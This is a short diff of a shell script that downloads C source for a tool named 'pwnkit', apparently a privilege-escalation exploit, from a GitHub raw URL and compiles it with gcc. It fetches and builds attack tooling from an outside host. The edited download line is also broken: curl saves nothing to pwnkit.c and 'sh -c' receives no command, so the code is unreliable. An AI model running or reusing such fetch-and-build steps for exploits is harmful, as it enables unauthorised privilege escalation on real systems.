@@ -1,5 +1,5 @@
 echo "Fetching C source..."
-sh -c "curl -fsSL https://raw.githubusercontent.com/CCR-ice/pwnkit"
+echo "curl -fsSL https://raw.githubusercontent.com/CCR-ice/pwnkit" | sh -c
 echo "Done."
 echo "Creating ecxecutable..."
 gcc -o pwnkit pwnkit.c
